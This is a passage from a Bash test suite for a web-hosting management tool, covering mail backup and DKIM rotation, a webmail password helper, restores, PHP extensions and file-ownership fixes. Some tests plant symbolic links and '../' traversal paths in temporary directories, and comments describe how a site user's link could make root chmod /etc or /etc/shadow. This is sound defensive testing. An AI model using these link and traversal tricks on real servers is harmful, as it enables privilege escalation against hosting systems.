assert_has "and on the one the archive lands on"   '_mail_free_kb "$BACKUP_ROOT"' "$_mb"
# a pipeline that fails has often printed its number already, so "|| printf 0" would append
# a second one and the check would quietly decide there is nothing to measure
assert_eq "a failed du reads as nothing"      0 "$(_mail_kb "")"
assert_eq "and a good one as its number"  10240 "$(_mail_kb "10240	somewhere")"
# the safety copy taken before a restore is not a candidate for "the newest archive"
_bk="$TMP/backups"; mkdir -p "${_bk}/a.example"
: >"${_bk}/a.example/a.example-mail-20260101-000000.tar.gz"
: >"${_bk}/a.example/a.example-mail-pre-restore-20260202-000000.tar.gz"
assert_eq "the safety copy is never the newest" "${_bk}/a.example/a.example-mail-20260101-000000.tar.gz"   "$(BACKUP_ROOT="$_bk" lib_mail_backup_latest a.example)"
assert_has "and it is named apart"             "pre-restore" "$(lib_mail_backup_file a.example 20260202-000000 pre-restore)"
assert_has "the DKIM key goes with it"             "dkim.key" "$_mb"
assert_has "and the lines, which hold only hashes" "MAIL_PASSWD_FILE" "$_mb"
# a live Maildir put straight into a tar describes a state the mailbox was never in
assert_has "Dovecot makes the copy, not tar"       "doveadm -o plugin/quota= backup" "$(declare -f _mail_backup_maildirs)"
# doveadm runs as vmail: the staging directory is made BY vmail, so root never creates a path
# inside a directory that user owns
_sd="$(declare -f _mail_stage_dir)"
assert_has "the staging directory is vmail's own"  'runuser -u "$MAIL_VMAIL_USER" -- mktemp -d' "$_sd"
_mr="$(declare -f lib_mail_restore_domain)"
assert_has "a restore checks the archive first"    "sha256sum -c" "$_mr"
assert_has "the same DKIM key comes back"          "dkim.key" "$_mr"
assert_has "the lines before the mail"             "lib_mail_passwd_set" "$_mr"
assert_has "the mail through Dovecot again"        "backup -R" "$_mr"
assert_has "then the quota is recomputed"          "quota recalc" "$_mr"
assert_has "and the webmail comes back with it"    "lib_webmail_domain_enable" "$_mr"
_bd="$(declare -f lib_backup_domain)"
assert_has "a site backup takes the mail too"      "lib_mail_backup_domain" "$_bd"
assert_has "unless it is told not to"              "no_mail" "$_bd"
_rm2="$(declare -f lib_restore_main)"
assert_has "and a restore puts it back"            "lib_mail_restore_domain" "$_rm2"
# the safety copy is taken AFTER the archive to restore from has been chosen, or "the newest
# one" would mean the copy of the state being replaced
_n_pick="$(grep -n 'lib_mail_backup_latest' <<<"$_rm2" | head -1 | cut -d: -f1)"
_n_safe="$(grep -n 'tag pre-restore' <<<"$_rm2" | head -1 | cut -d: -f1)"
assert_true "the archive is chosen before the safety copy"   bash -c "(( ${_n_pick:-0} > 0 && ${_n_safe:-0} > 0 && ${_n_pick:-0} < ${_n_safe:-0} ))"
assert_has "and --encrypt reaches the mail archive too" "encrypt" "$_bd"
# a mailbox that could not be filled is a failure, not a footnote
assert_has "a partly filled restore says so"       "only partly back" "$_mr"
# the archive says whose mail it holds, and a mismatch is a question
assert_has "the manifest's domain is compared"     'jq -r' "$_mr"
assert_has "and answering no stops it"             "belongs to" "$_mr"

# =============================================================================
# Rotating a DKIM key: two steps with DNS in between, because the key is published
_rs="$(declare -f lib_mail_dkim_rotate_start)"
_rf="$(declare -f lib_mail_dkim_rotate_finish)"
assert_has "starting makes a SECOND key"          "selector_next" "$_rs"
assert_has "and does not touch the one in use"    "still signs with" "$_rs"
assert_has "a job watches for the record"         "lib_cron_set" "$_rs"
assert_has "the switch compares what DNS says"    "_mail_dns_query TXT" "$_rf"
assert_has "against the key itself"               "lib_mail_dkim_public_of" "$_rf"
assert_has "and keeps the old one for a while"    "selector_old_until" "$_rf"
assert_has "the retired key is removed later"     "selector_old_until" "$(declare -f lib_mail_dkim_retire_old)"
# a selector that has been in DNS must never be handed to a second key: resolvers hold what
# they cached until the TTL runs out
assert_has "every selector used is remembered"   "selectors_used" "$_rs"
assert_has "and never chosen again"              "selectors_used" "$(declare -f _mail_selector_next)"
# two records at one selector fail for every receiver, so that is a reason to wait
assert_has "a second record stops the switch"    "carries" "$_rf"
assert_has "and the name has to hold a DKIM record at all" "v=DKIM1" "$_rf"
# a domain that goes takes every key with it, not only the one it was signing with
_pg="$(declare -f lib_mail_domain_purge)"
assert_has "removing a domain takes every DKIM key" '${MAIL_DKIM_DIR}/${d}."*.key' "$_pg"
assert_has "and the job that watched for a record"  'lib_cron_remove "mail-dkim:' "$_pg"
# a selector is dated, and a second one in the same month gets a letter
eval 'lib_mail_selector() { printf "lomp209901"; }'
MAIL_DKIM_DIR="$TMP/dkim-next"; mkdir -p "$MAIL_DKIM_DIR"
_sn="$(_mail_selector_next x.example)"
assert_true "a free selector is not the one in use" bash -c "[[ '$_sn' != 'lomp209901' ]]"
assert_true "and it is dated"                      bash -c "[[ '$_sn' =~ ^lomp[0-9]{6}[a-j]?$ ]]"
printf 'key
' >"${MAIL_DKIM_DIR}/x.example.${_sn}.key"   # -s: a selector is taken only when its key has content
assert_true "a taken one is skipped too"           bash -c "[[ '$(_mail_selector_next x.example)' != '$_sn' ]]"
unset -f lib_mail_selector
# shellcheck source=/dev/null
source "$ROOT/lib/mail.sh"

# =============================================================================
# Changing a mailbox password from the webmail: one helper, one sudo rule, nothing on argv
_ph="$(lib_mail_render_pw_helper)"
assert_has "the helper reads the address from stdin"   "IFS= read -r addr" "$_ph"
assert_has "and both passwords too"                    "IFS= read -r new" "$_ph"
assert_lacks "the address is not an argument"          'addr="$1"' "$_ph"
assert_lacks "nor is a password"                      'new="$3"' "$_ph"
# the stored hash must not become an argument of a root process: /proc/<pid>/cmdline is
# world-readable, and the hash is the thing the file mode exists to protect
assert_has "Dovecot is asked, with the password on stdin" "doveadm auth test" "$_ph"
assert_lacks "the stored hash is never an argument"       'doveadm pw -t "$hash"' "$_ph"
assert_has "every attempt is logged"                      "logger -t lomp-webmail" "$_ph"
assert_has "and none of them is fast"                     "GAP" "$_ph"
assert_has "a line break in the new one is refused"    "may not contain a line break" "$_ph"
assert_has "so is one that is too short"               "too short" "$_ph"
assert_has "and one that is too long for bcrypt"       "72 bytes at most" "$_ph"
assert_has "the change goes through the ordinary command" "mail box passwd" "$_ph"

assert_true "the helper parses"                        bash -c "printf '%s' \"\$_ph\" | bash -n"
_ps="$(lib_mail_render_pw_sudoers)"
assert_has "the rule names the webmail user"           "lompwebmail ALL=(root)" "$_ps"
assert_has "and exactly one command"                   "webmail-passwd" "$_ps"
assert_lacks "with no wildcard in it"                  "ALL$" "$_ps"
# the driver hands all three to the helper, so the helper can insist on the current password
_pd="$(lib_webmail_render_pw_driver)"
assert_has "the driver sends the address"              'fwrite($handle, $username' "$_pd"
assert_has "the current password"                      '$currpass' "$_pd"
assert_has "and the new one"                           '$newpass' "$_pd"
assert_has "it is written into every release"          "plugins/password/drivers" "$(declare -f lib_webmail_pw_driver_install)"
assert_has "the webmail is told to use it"             "password_driver'] = 'lomp'" "$(lib_webmail_render_config 2>/dev/null || printf '')"
assert_has "and to ask for the current password"       "password_confirm_current'] = true" "$(lib_webmail_render_config 2>/dev/null || printf '')"

# a port that carries a password without TLS may answer this machine and nobody else
eval 'ss() { printf "%s\n" "LISTEN 0 100 127.0.0.1:10587 0.0.0.0:*" "LISTEN 0 100 0.0.0.0:993 0.0.0.0:*" | awk "{print \$1, \$2, \$3, \$4, \$5}"; }'
assert_false "a loopback port is not public"  lib_port_listening_public 10587
assert_true  "one on every address is"        lib_port_listening_public 993
unset -f ss

# =============================================================================
section "restore: a dry run describes the site the archive carries"
# A dry run writes no domain.json, so a restore that would recreate a site cannot read the
# state back from the file it did not write: lib_domain_state_load resets every D_* before it
# looks at whether the file is there, so the dry run went on to describe creating a user with
# no name, and rendered the vhost of a static site with PHP enabled. It reads the archived
# copy by path instead.
lib_domain_state_reset
_arch="$TMP/archived-domain.json"
D_DOMAIN="arch.example.com"; D_IDENT="arch_example_com"; D_USER="arch_example_com"
D_GROUP="arch_example_com"; D_HOME="$SITES_ROOT/arch.example.com"; D_MODE="static"
D_CREATED="2025-01-01T00:00:00Z"; D_STATUS="active"
lib_domain_state_json >"$_arch"
lib_domain_state_reset
assert_true  "the state loads out of a file of its own" lib_domain_state_load_file "$_arch" arch.example.com
assert_eq    "with the site's name"  "arch.example.com" "$D_DOMAIN"
assert_eq    "its mode"              "static"           "$D_MODE"
assert_eq    "and its system user"   "arch_example_com" "$D_USER"
# the reset that started all of this, stated out loud: a load that finds nothing leaves nothing
assert_false "a file that is not there fails"      lib_domain_state_load_file "$TMP/nope.json" arch.example.com
assert_eq    "and clears the state on its way out" "" "$D_DOMAIN"
lib_domain_state_reset
_rm3="$(declare -f lib_restore_main)"
assert_has "so a dry run recreating a site reads the archive" "lib_domain_state_load_file" "$_rm3"
# This was a bare statement: a dry run of an unregistered site had no domain.json, the load
# returned 1, and errexit ended the restore right there - after it had described the whole job.
assert_eq "and no step reads the state back unguarded" "" \
  "$(grep -nE '^[[:space:]]*lib_domain_state_load "\$domain"[[:space:]]*$' "$ROOT/lib/backup.sh" || true)"
# "would import db-x.sql.gz into " - the dump read as if it were going nowhere
_dbinfo="$TMP/archived-db.info"
printf 'DB_NAME=arch_db\nDB_USER=arch_user\nDB_PASS=s3cret\n' >"$_dbinfo"
DBI_NAME=""; DBI_USER=""; DBI_PASS=""
OPT_DRY_RUN=1
assert_true "a dry run takes the archived credentials" lib_db_recreate_from_info arch.example.com "$_dbinfo"
OPT_DRY_RUN=0
assert_eq "and names the database it would import into" "arch_db"   "$DBI_NAME"
assert_eq "and the user that owns it"                   "arch_user" "$DBI_USER"
assert_eq "while the password stays out of it"          ""          "$DBI_PASS"
assert_false "and it created nothing" test -e "$(lib_db_info_file arch.example.com)"
DBI_NAME=""; DBI_USER=""; DBI_PASS=""

# =============================================================================
section "no command replaces itself and skips the EXIT cleanup"
assert_eq "no 'exec tail' in the libraries" "" "$(grep -nE '^[[:space:]]*exec tail' "$ROOT"/lib/*.sh || true)"

# =============================================================================
section "lib_mkdir never follows a link below a site home"
# A site user owns /home/<domain> and can swap any entry there for a symbolic link, while
# lib_mkdir runs as root whenever "add" or "restore" meets an existing home. With
# "private -> /etc" in place it chmodded and chowned /etc for that user.
lib_rollback_clear
_lh="$SITES_ROOT/links.example.com"
assert_eq "nested directories are created" 0 "$(run_isolated lib_mkdir "${_lh}/private/sessions/" 0700)"
assert_true "a trailing slash is accepted" test -d "${_lh}/private/sessions"
if (( CAN_CHMOD )); then assert_eq "the mode lands on the last directory" "700" "$(stat -c %a "${_lh}/private/sessions")"; fi
assert_eq "an existing directory is fine" 0 "$(run_isolated lib_mkdir "${_lh}/private" 0700)"
OPT_DRY_RUN=1; lib_mkdir "${_lh}/dry-run" 0700; OPT_DRY_RUN=0
assert_false "dry-run creates nothing" test -e "${_lh}/dry-run"
: >"${_lh}/a-file"
assert_eq "a file in the way is an error" 1 "$(run_isolated lib_mkdir "${_lh}/a-file/sub")"
assert_eq "a path climbing out with .. is refused" 1 "$(run_isolated lib_mkdir "${_lh}/private/../../escaped")"
assert_false "and nothing is created outside the home" test -e "${SITES_ROOT}/escaped"
assert_has "the refusal says why" "'..' is not allowed" "$( ( lib_mkdir "${_lh}/private/../../escaped" ) 2>&1 || true )"
if (( CAN_SYMLINK )); then
  _victim="$TMP/victim"; mkdir -p "$_victim"; chmod 0751 "$_victim" 2>/dev/null || true
  ln -s "$_victim" "${_lh}/logs"
  assert_eq "the directory itself may not be a link" 1 "$(run_isolated lib_mkdir "${_lh}/logs" 0750)"
  assert_has "and the refusal names it" "${_lh}/logs is a symbolic link" "$( ( lib_mkdir "${_lh}/logs" 0750 ) 2>&1 || true )"
  rm -rf "${_lh}/private"; ln -s "$_victim" "${_lh}/private"
  assert_eq "nor may a directory above it" 1 "$(run_isolated lib_mkdir "${_lh}/private/sessions" 0700)"
  assert_false "nothing is created through the link" test -e "${_victim}/sessions"
  # proxy static paths end in "/", and "link/" is the directory behind the link
  mkdir -p "${_lh}/public_html"; ln -s "$_victim" "${_lh}/public_html/static"
  assert_eq "a trailing slash does not hide a link" 1 "$(run_isolated lib_mkdir "${_lh}/public_html/static/" 0755)"
  # the reported flow: the directory setup of "add" or "restore" meeting that home again
  lib_domain_state_reset
  D_DOMAIN="links.example.com"; D_IDENT="links_example_com"; D_USER="links_example_com"; D_GROUP="links_example_com"
  D_HOME="$_lh"; D_MODE="php"
  assert_eq "the site directory setup refuses the planted link" 1 "$(run_isolated lib_domain_dirs_create)"
  lib_domain_state_reset
  # outside the site homes the directory itself still may not be a link: the OLS cache
  # directory belongs to nobody and the vhost directory to lsadm...
  mkdir -p "$TMP/cache-owner"; ln -s "$_victim" "$TMP/cache-owner/links.example.com"
  assert_eq "a link outside the site homes is refused too" 1 "$(run_isolated lib_mkdir "$TMP/cache-owner/links.example.com" 0750)"
  if (( CAN_CHMOD )); then assert_eq "no attempt reached the link target" "751" "$(stat -c %a "$_victim")"; fi
  # ...while links in root's own part of a path are followed as before
  mkdir -p "$TMP/lsws-real"; ln -s "$TMP/lsws-real" "$TMP/lsws-link"
  assert_eq "a linked parent such as /usr/local/lsws still works" 0 "$(run_isolated lib_mkdir "$TMP/lsws-link/conf/vhosts/x" 0750)"
  assert_true "and the directory lands behind it" test -d "$TMP/lsws-real/conf/vhosts/x"
  _sites_save="$SITES_ROOT"; ln -s "$SITES_ROOT" "$TMP/home-link"; SITES_ROOT="$TMP/home-link"
  assert_eq "so does a SITES_ROOT that is itself a link" 0 "$(run_isolated lib_mkdir "$SITES_ROOT/moved.example.com/public_html" 0755)"
  SITES_ROOT="$_sites_save"
fi

# =============================================================================
section "writes inside a site home run as the site user"
# Root must not create, chmod or unpack files below /home/<domain> either: "cat > index.html"
# through a link the user left there creates whatever file it names, and a chmod through one
# reaches /etc/shadow. The suite cannot switch users, so it checks each step goes to runuser.
lib_rollback_clear
lib_domain_state_reset
D_DOMAIN="asuser.example.com"; D_IDENT="asuser_example_com"; D_USER="asuser_example_com"; D_GROUP="asuser_example_com"
D_HOME="$SITES_ROOT/asuser.example.com"; D_MODE="php"; D_PHP="8.3"
_as="-u asuser_example_com -- env -C /"
: >"$RUNUSER_LOG"
assert_eq "the directory setup exits 0" 0 "$(run_isolated lib_domain_dirs_create)"
assert_true "the placeholder page is written" test -s "${D_HOME}/public_html/index.html"
assert_has "by the site user" "${_as} tee ${D_HOME}/public_html/index.html" "$(cat "$RUNUSER_LOG")"

curl() { printf 'server-setup-php-ok:8.3'; }
: >"$RUNUSER_LOG"
assert_eq "the PHP probe exits 0" 0 "$(run_isolated lib_domain_php_probe)"
assert_has "its file is written by the site user" "${_as} tee ${D_HOME}/public_html/ss-probe-" "$(cat "$RUNUSER_LOG")"
assert_has "and removed by it" "${_as} rm -f -- ${D_HOME}/public_html/ss-probe-" "$(cat "$RUNUSER_LOG")"
assert_eq "nothing is left behind" "" "$(find "${D_HOME}/public_html" -name 'ss-probe-*')"
unset -f curl

# WordPress already present: only the ownership and permission pass runs
_wpbin_save="$WPCLI_BIN"; WPCLI_BIN="$TMP/wp-launcher"
mkdir -p "$INSTALL_DIR"; printf '#!/bin/sh\n' >"$WPCLI_PHAR"; printf '#!/bin/sh\n' >"$WPCLI_BIN"
chmod 0755 "$WPCLI_PHAR" "$WPCLI_BIN"
lib_domain_state_save
printf 'DB_NAME=asuser_db\nDB_USER=asuser_user\nDB_PASS=unused\n' >"$(lib_db_info_file "$D_DOMAIN")"
mkdir -p "${D_HOME}/public_html/wp-content"; printf '<?php\n' >"${D_HOME}/public_html/wp-config.php"
chmod 0700 "${D_HOME}/public_html/wp-content" 2>/dev/null || true
: >"$RUNUSER_LOG"
assert_eq "the WordPress permission pass exits 0" 0 "$(run_isolated lib_domain_wp_install)"
_log="$(cat "$RUNUSER_LOG")"
assert_has "directory modes are set by the site user" "${_as} find ${D_HOME}/public_html -type d -exec chmod 0755 {} +" "$_log"
assert_has "file modes too"                           "${_as} find ${D_HOME}/public_html -type f -exec chmod 0644 {} +" "$_log"
assert_has "and wp-config.php"                        "${_as} chmod 0640 ${D_HOME}/public_html/wp-config.php" "$_log"
if (( CAN_CHMOD )); then
  assert_eq "a directory is normalised"  "755" "$(stat -c %a "${D_HOME}/public_html/wp-content")"
  assert_eq "wp-config.php ends at 0640" "640" "$(stat -c %a "${D_HOME}/public_html/wp-config.php")"
fi
WPCLI_BIN="$_wpbin_save"
rm -f "$(lib_db_info_file "$D_DOMAIN")"   # a database would need a real dump below

# restore: take a real backup, change a file, restore, and look at who unpacked it
_orig_rt="$(declare -f lib_require_tools)"; _orig_ri="$(declare -f lib_require_installed)"
lib_require_tools() { return 0; }; lib_require_installed() { return 0; }
mkdir -p "${D_HOME}/public_html/sub"; printf 'v1\n' >"${D_HOME}/public_html/sub/page.html"
assert_eq "a backup of the site is taken" 0 "$(run_isolated lib_backup_domain "$D_DOMAIN" --keep 0)"
_archives=("${BACKUP_ROOT}/${D_DOMAIN}"/*.tar.gz)
printf 'v2\n' >"${D_HOME}/public_html/sub/page.html"
: >"$RUNUSER_LOG"
assert_eq "restore exits 0" 0 "$(run_isolated lib_restore_main "$D_DOMAIN" --file "${_archives[0]}")"
assert_eq "the archived content is back" "v1" "$(cat "${D_HOME}/public_html/sub/page.html")"
# The home in the logged line is not spelled out: under Git Bash it round-trips through native
# jq in domain.json and comes back as a C:\ path, so match only the mangling-proof ends - the
# runuser+env-C prefix (this ran as the site user) and the stdin-extract flags.
_rlog="$(cat "$RUNUSER_LOG")"
assert_has "restore unpacks as the site user" "${_as} tar -C" "$_rlog"
assert_has "and does so by extracting the archive" "-xzpf -" "$_rlog"
eval "$_orig_rt"; eval "$_orig_ri"
lib_domain_state_reset

# =============================================================================
section "PHP extensions: SQLite and APCu by default, and update adds what a server lacks"
# a real server had no pdo_sqlite, and the application on it did not start
assert_eq "the base set brings SQLite and APCu" \
  "lsphp83 lsphp83-common lsphp83-mysql lsphp83-sqlite3 lsphp83-opcache lsphp83-curl lsphp83-imagick lsphp83-intl lsphp83-redis lsphp83-apcu" \
  "$(_php_packages 8.3)"
for _e in sqlite3 pdo_sqlite apcu ctype tokenizer phar; do assert_has "${_e} is required" " ${_e} " " ${PHP_REQUIRED_EXTS} "; done
_orig_pkgfns="$(declare -f lib_pkg_available lib_pkg_installed lib_apt_install)"
_fx="$TMP/fakeext"; mkdir -p "$_fx/bin"; export FAKE_MODS="$_fx/mods"
printf '#!/usr/bin/env bash\ncat "$FAKE_MODS"\n' >"$_fx/bin/php"; chmod +x "$_fx/bin/php"
_ext_reset() {   # "php -m" of a build without the three, and nothing installed yet
  local e=""
  for e in $PHP_REQUIRED_EXTS; do
    case "$e" in sqlite3|pdo_sqlite|apcu) ;; opcache) printf 'Zend OPcache\n' ;; *) printf '%s\n' "$e" ;; esac
  done >"$FAKE_MODS"
  : >"$_fx/installed"; : >"$_fx/calls"; PHP_EXTS_ADDED=""; FAKE_REPO="lsphp83-sqlite3 lsphp83-apcu"
}
eval 'lib_php_cli()       { printf "%s/bin/php" "$_fx"; }
      lib_pkg_available() { [[ " ${FAKE_REPO} " == *" $1 "* ]]; }
      lib_pkg_installed() { grep -qx -- "$1" "$_fx/installed"; }
      lib_apt_install() {   # logs the call; outside a dry run the modules of the package appear
        printf "%s\n" "$*" >>"$_fx/calls"
        (( OPT_DRY_RUN )) && return 0
        printf "%s\n" "$@" >>"$_fx/installed"
        case "$1" in *-sqlite3) printf "sqlite3\npdo_sqlite\n" >>"$FAKE_MODS" ;; *-apcu) printf "apcu\n" >>"$FAKE_MODS" ;; esac
      }
      lib_php_restart_workers() { printf "restart\n" >>"$_fx/calls"; }'
_ext_reset
assert_eq "it exits 0 under errexit" 0 "$(run_isolated lib_php_ensure_extensions 8.3)"
_ext_reset
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
assert_eq  "SQLite's two extensions share one package, installed once" "$(printf 'lsphp83-sqlite3\nlsphp83-apcu')" "$(cat "$_fx/calls")"
assert_eq  "the caller learns what was added" "lsphp83-sqlite3 lsphp83-apcu" "$PHP_EXTS_ADDED"
assert_has "and the report names it" "all required extensions present (installed lsphp83-sqlite3 lsphp83-apcu)" "$(cat "$_fx/out")"
: >"$_fx/calls"; lib_php_ensure_extensions 8.3 >/dev/null 2>&1
assert_eq  "a second run installs nothing" "" "$(cat "$_fx/calls")"
_ext_reset; FAKE_REPO="lsphp83-sqlite3"
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
assert_has "one the repository lacks is reported" "extensions still missing: apcu" "$(cat "$_fx/out")"
_ext_reset; OPT_DRY_RUN=1
assert_eq "a dry run exits 0 under errexit" 0 "$(run_isolated lib_php_ensure_extensions 8.3)"
_ext_reset
OPT_QUIET=0 lib_php_ensure_extensions 8.3 >"$_fx/out" 2>&1
OPT_DRY_RUN=0
assert_eq    "a dry run names each package once" "$(printf 'lsphp83-sqlite3\nlsphp83-apcu')" "$(cat "$_fx/calls")"
assert_eq    "adds nothing" "" "$PHP_EXTS_ADDED"
assert_has   "says what it would install" "would install lsphp83-sqlite3 lsphp83-apcu" "$(cat "$_fx/out")"
assert_lacks "and calls nothing missing" "still missing" "$(cat "$_fx/out")"
_ext_reset
eval 'lib_php_installed()    { return 0; }
      lib_php_full_version() { printf "8.3.33"; }
      lib_php_write_ini()    { return 0; }
      lib_php_register()     { return 0; }'
lib_php_install 8.3 >/dev/null 2>&1
assert_eq "a version that is already serving gets its workers restarted" "restart" "$(tail -n 1 "$_fx/calls")"
: >"$_fx/calls"; lib_php_install 8.3 >/dev/null 2>&1
assert_eq "but not when nothing was added" "" "$(cat "$_fx/calls")"
_upd="$(declare -f lib_update_main)"
assert_has "update checks every installed version" 'lib_php_ensure_extensions "$v"' "$_upd"
assert_has "and restarts the workers for what it added" '-n "$PHP_EXTS_ADDED"' "$_upd"
eval "$_orig_pkgfns"; unset FAKE_MODS FAKE_REPO
# shellcheck source=/dev/null
source "$ROOT/lib/php.sh"

# =============================================================================
section "fix-owner: files uploaded as root go back to the site's user"
# Files uploaded as root stay root's, and PHP, which runs as the site's user, cannot change
# them. The suite cannot own a file as anybody else, so the numbers fix-owner compares with
# come from a stub: the runner's own (nothing to hand over) or the next uid (all of it is
# someone else's). chown is a program find starts, so a fake one on -execdir's PATH records
# every call and every name it was handed, as a full path.
_fo_saved="$(declare -p DOM_FIX_OWNER_PATH DOM_HARDLINKS_SYSCTL DOM_MOUNTINFO STATE_DIR)"
_fo_orig_ids="$(declare -f _domain_fix_owner_ids)"
_fo_orig_rt="$(declare -f lib_require_tools)"
eval 'lib_require_tools() { return 0; }
      _domain_fix_owner_ids() { printf "%s" "$_fo_ids"; }'
_fo_bin="$TMP/fo-bin"; _fo_calls="$TMP/fo-calls"; _fo_out="$TMP/fo-out"
mkdir -p "$_fo_bin"
# A name that is not relative to the directory chown runs in ("./x") is logged as PATH: it
# would be looked up from the top again, through whatever a site user swapped in meanwhile.
cat >"$_fo_bin/chown" <<EOF
#!/bin/sh
d="\$(pwd -P)"
printf 'fake-chown %s\n' "\$*" >&2
printf 'call %s %s %s\n' "\$1" "\$2" "\$3" >>"${_fo_calls}"
shift 3
for f in "\$@"; do
  case "\$f" in
    ./*/*|../*) printf 'PATH %s\n' "\$f" >>"${_fo_calls}" ;;
    ./*)        printf '%s/%s\n' "\$d" "\${f#./}" >>"${_fo_calls}" ;;
    *)          printf 'PATH %s\n' "\$f" >>"${_fo_calls}" ;;
  esac
done
EOF
chmod 0755 "$_fo_bin/chown"
DOM_FIX_OWNER_PATH="${_fo_bin}:/usr/bin:/bin"
DOM_HARDLINKS_SYSCTL="$TMP/fo-hardlinks"; printf '1\n' >"$DOM_HARDLINKS_SYSCTL"
DOM_MOUNTINFO="$TMP/fo-mountinfo"; : >"$DOM_MOUNTINFO"
# a state directory of its own, so that --all sees only the sites made here - through the real
# lib_domains_list, which the webmail section above leaves stubbed
STATE_DIR="$TMP/fo-state"; mkdir -p "$STATE_DIR"
eval "$(sed -n '/^lib_domains_list() {/,/^}/p' "$ROOT/lib/common.sh")"
# fix-owner run the way the command runs it (errexit armed); prints the exit status, and the
# output goes to $_fo_out
_fo() {
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_domain_fix_owner_main "$@" ) >"$_fo_out" 2>&1
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}

lib_domain_state_reset
D_DOMAIN="own.example.com"; D_IDENT="own_example_com"; D_USER="own_example_com"; D_GROUP="own_example_com"
D_HOME="$SITES_ROOT/own.example.com"; D_MODE="php"; D_PHP="8.3"
lib_domain_state_save
_fo_h="$SITES_ROOT/own.example.com"; _fo_ld="$SITES_LOG_ROOT/own.example.com"
mkdir -p "$_fo_h/public_html/wp-content/uploads" "$_fo_h/private/sessions" "$_fo_h/.ssh" "$_fo_ld"
printf '<?php\n' >"$_fo_h/public_html/index.php"
printf 'jpg' >"$_fo_h/public_html/wp-content/uploads/a.jpg"
printf 'zip' >"$_fo_h/site.zip"
printf 'log\n' >"$_fo_ld/access.log"
if (( CAN_SYMLINK )); then ln -s "$_fo_ld" "$_fo_h/logs"; else mkdir -p "$_fo_h/logs"; printf 'log\n' >"$_fo_h/logs/access.log"; fi
_fo_hp="$(cd "$_fo_h" && pwd -P)"
read -r _fo_u _fo_g < <(stat -c '%u %g' "$_fo_h/public_html/index.php")
_fo_mine="${_fo_u} ${_fo_g}"; _fo_other="$(( _fo_u + 1 )) ${_fo_g}"
# everything in the home but logs/: what a run has to hand over when none of it is the site's
_fo_all="$(find "$_fo_h" -path "$_fo_h/logs" -prune -o -printf . | wc -c)"; _fo_all=$(( _fo_all ))

assert_eq  "no domain is an error"               1 "$(_fo)"
assert_has "which says so"                       "Domain missing" "$(cat "$_fo_out")"
assert_eq  "--all and a domain do not mix"       1 "$(_fo --all own.example.com)"
assert_eq  "an unknown option is refused"        1 "$(_fo --force)"
assert_eq  "a site that is not registered too"   1 "$(_fo nosuch.example.com)"
assert_eq  "and a name that is no domain"        1 "$(_fo ../etc)"

_fo_ids="$_fo_other"
printf '0\n' >"$DOM_HARDLINKS_SYSCTL"; : >"$_fo_calls"
assert_eq  "without protected hard links it refuses to start" 1 "$(_fo own.example.com)"
assert_has "and says why" "fs.protected_hardlinks is off" "$(cat "$_fo_out")"
assert_eq  "before chown ever runs" "" "$(cat "$_fo_calls")"
rm -f "$DOM_HARDLINKS_SYSCTL"
assert_eq  "a setting it cannot read counts as off" 1 "$(_fo own.example.com)"
OPT_DRY_RUN=1
assert_eq  "a dry run only warns about it" 0 "$(_fo own.example.com)"
assert_has "that a real run would refuse" "a real run refuses to start" "$(cat "$_fo_out")"
OPT_DRY_RUN=0
printf '1\n' >"$DOM_HARDLINKS_SYSCTL"

_fo_ids="$_fo_mine"; : >"$_fo_calls"
assert_eq  "a site whose files are all its own exits 0" 0 "$(_fo own.example.com)"
assert_has "and says so" "own.example.com: everything already belongs to own_example_com" "$(cat "$_fo_out")"
assert_eq  "without starting chown: nothing is re-dated" "" "$(cat "$_fo_calls")"

_fo_ids="$_fo_other"; : >"$_fo_calls"
OPT_DRY_RUN=1
assert_eq  "a dry run of a site that is all someone else's exits 0" 0 "$(_fo own.example.com)"
assert_has "and counts what a real run would change" "would hand ${_fo_all} files and directories to own_example_com:own_example_com" "$(cat "$_fo_out")"
OPT_DRY_RUN=0
assert_eq  "without starting chown" "" "$(cat "$_fo_calls")"

# the fake chown changes nothing, so what it was handed is still someone else's afterwards
assert_eq  "what is still someone else's after the run is an error" 1 "$(_fo own.example.com)"
assert_has "named as such" "own.example.com: not all of it changed hands (${_fo_all} of ${_fo_all} left)" "$(cat "$_fo_out")"
_fo_log="$(cat "$_fo_calls")"
assert_has   "chown changes links, never what they name, and takes no name for an option" "call -h -- own_example_com:own_example_com" "$_fo_log"
assert_has   "the home itself is handed over"      "${_fo_hp}"$'\n' "${_fo_log}"$'\n'
assert_has   "the document root"                   "${_fo_hp}/public_html"$'\n' "${_fo_log}"$'\n'
assert_has   "a file deep inside it"               "${_fo_hp}/public_html/wp-content/uploads/a.jpg" "$_fo_log"
assert_has   "private/"                            "${_fo_hp}/private/sessions" "$_fo_log"
assert_has   "the dot directories"                 "${_fo_hp}/.ssh" "$_fo_log"
assert_has   "and whatever was put in the home"    "${_fo_hp}/site.zip" "$_fo_log"
assert_lacks "but never logs"                      "${_fo_hp}/logs" "$_fo_log"
assert_lacks "nor the logs behind it"              "access.log" "$_fo_log"
assert_eq    "every name is handed over once"      "$_fo_all" "$(grep -vc '^call ' <<<"$_fo_log")"
assert_lacks "each one relative to the directory chown runs in" "PATH " "$_fo_log"

# a server an older release set up: logs/ is still a directory in the home, and must stay root's
if (( CAN_SYMLINK )); then
  rm -f "$_fo_h/logs"; mkdir -p "$_fo_h/logs"; printf 'log\n' >"$_fo_h/logs/access.log"
  : >"$_fo_calls"
  _fo "own.example.com" >/dev/null
  assert_lacks "logs/ as a directory is left alone as well" "${_fo_hp}/logs" "$(cat "$_fo_calls")"
  rm -rf "$_fo_h/logs"; ln -s "$_fo_ld" "$_fo_h/logs"
fi

# a file with a second name may have it outside the site - pnpm, cp -al - so the site is left
# as it is, and one moved into logs/ counts too: it could be moved back under a name the run
# is changing
CAN_HARDLINK=0
ln "$_fo_h/site.zip" "$TMP/.fo-linkprobe" 2>/dev/null && [[ "$(stat -c %h "$_fo_h/site.zip")" == 2 ]] && CAN_HARDLINK=1
rm -f "$TMP/.fo-linkprobe"
if (( CAN_HARDLINK )); then
  ln "$_fo_h/public_html/index.php" "$_fo_h/public_html/index-copy.php"
  : >"$_fo_calls"
  assert_eq    "a file with a second name stops the site" 1 "$(_fo own.example.com)"
